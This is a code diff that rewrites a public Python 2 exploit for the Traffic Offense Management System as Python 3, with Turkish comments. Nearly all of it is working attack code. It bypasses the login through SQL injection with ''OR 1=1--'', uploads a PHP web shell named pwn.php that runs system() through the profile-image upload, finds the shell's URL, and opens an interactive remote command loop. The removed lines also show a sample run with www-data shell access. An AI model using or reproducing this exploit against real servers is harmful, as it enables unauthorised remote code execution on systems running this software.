@@ -16,121 +16,147 @@
 # and the directory it is placed in allows for execution of PHP code.
 
 
-"""
-(hltakydn@SpaceSec)-[~/Exploits-db/traffic_offense]
-$ python2 exploit.py
-
-Example: http://example.com
-
-Url: http://trafficoffense.com
-
-[?] Check Adress
-
-[+] Bypass Login
-
-[+] Upload Shell
-
-[+] Exploit Done!
-
-$ whoami
-www-data
-
-$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
-$ pwd
-/var/www/html/uploads
-
-$ 
-
-"""
-
-
-
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 import requests
-import time
-from bs4 import BeautifulSoup
 import sys
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse, urljoin
 
-def exploit(target_url):
+# Renkli çıktılar için
+class Colors:
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
 
-    print("\nExample: http://example.com\n")
+print(f"{Colors.BOLD}--- Traffic Offense Management System RCE (Python 3) ---{Colors.ENDC}")
 
-    url = raw_input("Url: ")
-    payload_name = "evil.php"
-    payload_file = "<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>"
+# URL'i al (Sonunda / olup olmamasını dert etme)
+url = input("Target URL (e.g. http://10.10.10.10/management): ").strip().rstrip('/')
 
-    if url.startswith(('http://', 'https://')):
-        print "Check Url ...\n"
+if not url.startswith(('http://', 'https://')):
+    url = "http://" + url
+
+# PHP Shell Payload
+payload_filename = "pwn.php"
+# Basit ama etkili shell
+payload_content = "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; die; } ?>"
+
+session = requests.Session()
+
+# 1. Aşama: Login Bypass
+print(f"[*] Attempting SQL Injection Login Bypass...")
+login_url = url + "/classes/Login.php?f=login"
+login_data = {
+    "username": "'' OR 1=1-- '", 
+    "password": "'' OR 1=1-- '"
+}
+
+try:
+    # Login isteği
+    r_login = session.post(login_url, data=login_data)
+    
+    # JSON cevabını kontrol et
+    if 'status":"success' in r_login.text or r_login.json().get('status') == 'success':
+        print(f"{Colors.OKGREEN}[+] Login Bypass Successful!{Colors.ENDC}")
     else:
-        print "\n[?] Check Adress\n"
-        url = "http://" + url
-
-    try:
-        response = requests.get(url)
-    except requests.ConnectionError as exception:
-        print("[-] Address not reachable")
+        print(f"{Colors.FAIL}[-] Login Failed! Response: {r_login.text}{Colors.ENDC}")
         sys.exit(1)
 
-    session = requests.session()
+    # 2. Aşama: Kullanıcı Bilgilerini Çekme (Admin Panelinden)
+    print("[*] Retrieving user details for upload...")
+    user_page_url = url + "/admin/?page=user"
+    r_user_page = session.get(user_page_url)
+    
+    soup = BeautifulSoup(r_user_page.text, 'html.parser')
+    
+    try:
+        userid = soup.find('input', {'name':'id'}).get("value")
+        firstname = soup.find('input', {'id':'firstname'}).get("value")
+        lastname = soup.find('input', {'id':'lastname'}).get("value")
+        username = soup.find('input', {'id':'username'}).get("value")
+    except AttributeError:
+        print(f"{Colors.FAIL}[-] Could not parse user details. Are you sure the path is correct?{Colors.ENDC}")
+        sys.exit(1)
 
-    request_url = url + "/classes/Login.php?f=login"
-    post_data = {"username": "'' OR 1=1-- '", "password": "'' OR 1=1-- '"}
-    bypass_user = session.post(request_url, data=post_data)
+    # 3. Aşama: Shell Yükleme
+    print("[*] Uploading PHP Shell...")
+    upload_url = url + "/classes/Users.php?f=save"
+    
+    # Multipart Form Data
+    multipart_data = {
+        "id": (None, userid),
+        "firstname": (None, firstname),
+        "lastname": (None, lastname),
+        "username": (None, username),
+        "password": (None, ""), # Şifreyi boş geçiyoruz
+    }
+    
+    # Dosyayı "img" parametresine gömüyoruz
+    files = {
+        'img': (payload_filename, payload_content, 'application/x-php')
+    }
 
-    if bypass_user.text == '{"status":"success"}':
-        print("[+] Bypass Login\n")
-        cookies = session.cookies.get_dict()
-        req = session.get(url + "/admin/?page=user")
-        parser = BeautifulSoup(req.text, 'html.parser')
-        userid = parser.find('input', {'name':'id'}).get("value")
-        firstname = parser.find('input', {'id':'firstname'}).get("value")
-        lastname = parser.find('input', {'id':'lastname'}).get("value")
-        username = parser.find('input', {'id':'username'}).get("value")
+    # Headerları requests kendisi halledecek (boundary vs.)
+    r_upload = session.post(upload_url, data=multipart_data, files=files)
 
-        request_url = url + "/classes/Users.php?f=save"
-        headers = {"sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryxGKa5dhQCRwOodsq", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
-        data = "------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n"+ userid +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"firstname\"\r\n\r\n"+ firstname +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"lastname\"\r\n\r\n"+ lastname +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n"+ username +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"img\"; filename=\""+ payload_name +"\"\r\nContent-Type: application/x-php\r\n\r\n" + payload_file +"\n\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq--\r\n"
-        upload = session.post(request_url, headers=headers, cookies=cookies, data=data)            
-        time.sleep(2)
-
-        if upload.text == "1":
-            print("[+] Upload Shell\n")
-            time.sleep(2)
-            req = session.get(url + "/admin/?page=user")
-            parser = BeautifulSoup(req.text, 'html.parser')
-            find_shell = parser.find('img', {'id':'cimg'})
-            print("[+] Exploit Done!\n")
-
-            while True:
-                try:
-                    cmd = raw_input("$ ")
-                    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'}
-                    request = requests.post(target_url + find_shell.get("src") + "?cmd=" + cmd, data={'key':'value'}, headers=headers)
-                    print request.text.replace("<pre>" ,"").replace("</pre>", "")
-                    time.sleep(1)
-                    
-                except KeyboardInterrupt:
-                    print("\nExploit Terminated:::\n")
-                    sys.exit(0)
-
-        elif upload.text == "2":
-            print("[-] Try the manual method")
-            request_url = target_url + "/classes/Login.php?f=logout"
-            cookies = session.cookies.get_dict()
-            headers = {"sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
-            session.get(request_url, headers=headers, cookies=cookies)
-        else:
-            print("[!] An unknown error")
+    if r_upload.text == "1":
+        print(f"{Colors.OKGREEN}[+] Shell Uploaded Successfully!{Colors.ENDC}")
     else:
-        print("[-] Failed to bypass login panel")
+        print(f"{Colors.FAIL}[-] Upload Failed. Response: {r_upload.text}{Colors.ENDC}")
+        # Bazen 1 dönmese de yüklüyor, devam edelim...
 
-if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        print("Usage: python2 <python_file_name> <target_url>")
-        print("Exam: python2 toms.py http://10.10.10.1:445")
-        sys.exit(0)
+    # 4. Aşama: Shell Yolunu Bulma
+    print("[*] Finding shell path...")
+    # Sayfayı yenileyip profil fotosunun (bizim shell) yoluna bakıyoruz
+    r_refresh = session.get(user_page_url)
+    soup_refresh = BeautifulSoup(r_refresh.text, 'html.parser')
+    
+    # Profil resmi id='cimg' olan element
+    shell_img_tag = soup_refresh.find('img', {'id':'cimg'})
+    
+    if not shell_img_tag:
+        print(f"{Colors.FAIL}[-] Could not find the uploaded shell image tag.{Colors.ENDC}")
+        sys.exit(1)
 
-    target_url = sys.argv[1]
-    exploit(target_url)
+    relative_path = shell_img_tag.get("src") # Örnek: /management/uploads/123_pwn.php
+    
+    # HATA ÇÖZÜMÜ BURADA:
+    # URL'i parçala ve domain kısmını al (http://10.10.10.10:445)
+    parsed_url = urlparse(url)
+    base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
+    
+    # Eğer gelen path zaten tam URL ise elleme, değilse birleştir
+    if relative_path.startswith("http"):
+        shell_full_url = relative_path
+    else:
+        # relative path genelde / ile başlar ama emin olalım
+        if not relative_path.startswith('/'):
+            relative_path = '/' + relative_path
+        # Burada urljoin yerine basit string birleştirme daha güvenli olabilir çünkü
+        # scriptin çalıştığı base path (/management) ile root path karışabilir.
+        # En garantisi: base_domain + relative_path
+        shell_full_url = base_domain + relative_path
+
+    print(f"{Colors.OKGREEN}[+] Shell URL found: {shell_full_url}{Colors.ENDC}")
+    print(f"{Colors.BOLD}--- Interactive Shell (Type 'exit' to quit) ---{Colors.ENDC}")
+
+    # 5. Aşama: Komut Döngüsü
+    while True:
+        cmd = input(f"{Colors.WARNING}Shell$ {Colors.ENDC}")
+        if cmd.lower() in ['exit', 'quit']:
+            break
+            
+        try:
+            # Komutu gönder
+            r_cmd = requests.post(shell_full_url, data={'cmd': cmd}, timeout=10)
+            
+            # <pre> taglarını temizle
+            output = r_cmd.text.replace("<pre>", "").replace("</pre>", "")
+            print(output)
+        except Exception as e:
+            print(f"Error executing command: {e}")
+
+except Exception as e:
+    print(f"{Colors.FAIL}An error occurred: {e}{Colors.ENDC}")
